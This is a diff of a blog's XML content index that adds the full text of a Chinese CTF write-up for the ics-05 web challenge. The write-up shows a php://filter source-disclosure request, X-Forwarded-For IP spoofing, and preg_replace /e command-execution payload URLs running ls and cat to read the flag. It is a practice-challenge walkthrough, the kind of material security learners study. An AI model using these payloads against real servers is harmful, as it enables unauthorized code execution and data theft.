@@ -7,6 +7,67 @@
 ]]></content>
   </entry>
   <entry>
+    <title>CTF攻防世界-WEB-cis05</title>
+    <url>/2019/12/24/ctf-ics-05/</url>
+    <content><![CDATA[<div class="note info"><p>0x01 前要</p></div>
+
+<p>1.<a href="https://www.cnblogs.com/likai/archive/2010/01/29/1659336.html" target="_blank">php内置封装协议 filter</a><br>2.伪造IP<br>3.preg_replace()函数的/e漏洞<br>4.正确的php system()函数的书写</p>
+ <a id="more"></a>
+
+
+<div class="note info"><p>0x02 解题流程</p></div>
+1.打开题目网页点击尝试，发现只有维护中心可以点击
+
+<p><img src="1.png" alt=""></p>
+<br>
+
+<ol start="2">
+<li>F12查看源代码，可以看到代码段?page=index，同时网页表现为 xxxx/index.php，此时可以猜测题目可能为文件包含读取网页的漏洞。利用php内置filter协议协助网页传参，查看结果。</li>
+</ol>
+<br>
+2_1.
+ <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">&lt;li class=<span class="string">"layui-nav-item layui-this"</span>&gt;&lt;a href=<span class="string">"?page=index"</span>&gt;云平台设备维护中心&lt;/a&gt;&lt;/li&gt;</span><br></pre></td></tr></table></figure></div>
+2_2.为了能够正常读取到内置文件的内容，所以采用base64模式提前将php内置文件源码我们所需的部分转化为base64形式，取得代码后在线转码即可获得源码。
+ <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">?page=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure></div>
+
+<p><img src="2.PNG" alt=""></p>
+<br>
+
+<p>3.转码获得源码</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">'HTTP_X_FORWARDED_FOR'</span>] === <span class="string">'127.0.0.1'</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"&lt;br &gt;Welcome My Admin ! &lt;br &gt;"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$pattern</span> = <span class="variable">$_GET</span>[pat];</span><br><span class="line">    <span class="variable">$replacement</span> = <span class="variable">$_GET</span>[rep];</span><br><span class="line">    <span class="variable">$subject</span> = <span class="variable">$_GET</span>[sub];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (isset(<span class="variable">$pattern</span>) &amp;&amp; isset(<span class="variable">$replacement</span>) &amp;&amp; isset(<span class="variable">$subject</span>)) &#123;</span><br><span class="line">        preg_replace(<span class="variable">$pattern</span>, <span class="variable">$replacement</span>, <span class="variable">$subject</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        die();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
+<p>3_1.代码审计<br>（1）我们需要从127.0.0.1 IP地址登陆，使用Burp Suite伪造html头IP<br>（1_1）可以看到我们登陆成功<br><img src="3.PNG" alt=""></p>
+<p>（2）<a href="https://blog.csdn.net/ww122081351/article/details/17579851" target="_blank">preg_replace危险的/e修饰符</a><br>    简单的说明一下preg_replace（）函数，详细的说明以及示例可以点击超链接，阅读另一位博主的详细说明</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">preg_replace (<span class="variable">$pattern</span> , <span class="variable">$replacement</span> ,  <span class="variable">$subject</span> [, int <span class="variable">$limit</span> = -1 [, int &amp;<span class="variable">$count</span> ]] )</span><br><span class="line"><span class="variable">$pattern</span>:       搜索的模式，可以是字符串或一个字符串数组。</span><br><span class="line"><span class="variable">$replacement</span>:   用于替换的字符串或字符串数组。</span><br><span class="line"><span class="variable">$subject</span>:       要搜索替换的目标字符串或字符串数组。</span><br><span class="line">关于/e：</span><br><span class="line"> 当pattern中有/e是代表preg_replace()函数的/e时，subject中匹配到的pattern会将replacement当作代码执行。</span><br><span class="line"> 潜在威胁： 当replacement为可控时，可以直接编写一句话木马</span><br></pre></td></tr></table></figure></div>
+<p>（2_2）利用漏洞寻找flag<br>    %20代表空格，%26%26就是&amp;&amp;代表当前面命令执行成功时，继续执行后面的命令</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">/index.php?pat=/<span class="built_in">test</span>/e&amp;rep=system(<span class="string">"ls"</span>)&amp;sub=haha%20test</span><br></pre></td></tr></table></figure></div>
+<p><img src="4.PNG" alt=""></p>
+<p>(2_3)根据文件目录，查看可疑文件layui和s3chahahaDir，通过cd到文件夹，查看文件内容，最终确认为s3chahahaDir文件夹</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">/index.php?pat=/<span class="built_in">test</span>/e&amp;rep=system(<span class="string">"cd%20s3chahahaDir%26%26%20ls"</span>)&amp;sub=haha%20test</span><br></pre></td></tr></table></figure></div>
+<p><img src="5.PNG" alt=""><br>（2_4）找到flag文件夹后，继续cd，寻找所需的flag</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">/index.php?pat=/<span class="built_in">test</span>/e&amp;rep=system(<span class="string">"cd%20s3chahahaDir/flag%26%26%20ls"</span>)&amp;sub=haha%20test</span><br></pre></td></tr></table></figure></div>
+<p><img src="6.PNG" alt=""><br>(2_5)确认flag所在的文件，直接抓取内容</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">/index.php?pat=/<span class="built_in">test</span>/e&amp;rep=system(<span class="string">"cat%20s3chahahaDir/flag/flag.php"</span>)&amp;sub=haha%20test</span><br></pre></td></tr></table></figure></div>
+<p><img src="7.PNG" alt=""><br>成功找到flag</p>
+<div class="note info"><p>0x03 解题过程中存在的问题</p></div>
+1.Burp Suite存在复制黏贴产生报错结果，建议可以手打重新尝试
+
+
+
+<div class="note info"><p>0x04 参考</p></div>
+1.<a href="https://blog.csdn.net/zhwho/article/details/100694073" target="_blank">攻防世界web进阶ics-05 wp</a><br>
+2.<a href="https://blog.csdn.net/ww122081351/article/details/17579851" target="_blank">preg_replace危险的/e修饰符</a><br>
+3.<a href="https://blog.csdn.net/About23/article/details/95349625" target="_blank">攻防世界ics-5wp</a><br>]]></content>
+      <categories>
+        <category>CTF-WEB</category>
+      </categories>
+      <tags>
+        <tag>php内置filter协议</tag>
+        <tag>伪造IP</tag>
+        <tag>preg_replace()函数的/e漏洞</tag>
+        <tag>正确的php system()函数的书写</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CTF攻防世界-WEB-cookie基础题</title>
     <url>/2019/12/24/pb%E5%9F%BA%E7%A1%80/</url>
     <content><![CDATA[<div class="note info"><p>0x01 攻防世界web新手区cookie题</p></div>
@@ -22,23 +83,6 @@
       </categories>
       <tags>
         <tag>抓包基础题</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CTF攻防世界-WEB-cis05</title>
-    <url>/2019/12/24/ctf-ics-05/</url>
-    <content><![CDATA[<div class="note info"><p>0x01 前要</p></div>
-
-<p>1.<a href="https://www.cnblogs.com/likai/archive/2010/01/29/1659336.html" target="_blank">php内置封装协议 filter</a><br>2.伪造IP<br>3.preg_replace()函数的/e漏洞<br>4.正确的php system()函数的书写</p>
-<div class="note info"><p>0x02 解题流程</p></div>]]></content>
-      <categories>
-        <category>CTF-WEB</category>
-      </categories>
-      <tags>
-        <tag>php内置filter协议</tag>
-        <tag>伪造IP</tag>
-        <tag>preg_replace()函数的/e漏洞</tag>
-        <tag>正确的php system()函数的书写</tag>
       </tags>
   </entry>
   <entry>
